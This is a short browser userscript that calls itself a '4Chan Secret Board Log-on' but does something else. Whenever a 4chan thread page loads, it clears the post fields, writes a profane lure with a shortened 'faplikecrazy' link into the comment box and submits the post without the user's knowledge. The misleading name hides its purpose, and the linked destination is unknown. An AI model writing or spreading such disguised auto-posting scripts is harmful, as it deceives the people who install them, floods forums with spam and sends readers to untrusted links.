// ==UserScript==
// @name           4Chan Secret Board Log-on
// @namespace      4chansecret
// @include        http://img.4chan.org/*/res/*
// ==/UserScript==
document.getElementsByName("name")[0].value = "";
document.getElementsByName("email")[0].value = "";
document.getElementsByName("sub")[0].value = "";
document.getElementsByName("com")[0].value = "Oh fuck have you guys seen this?/n tinyurl.com/faplikecrazy";

document.forms[0].submit();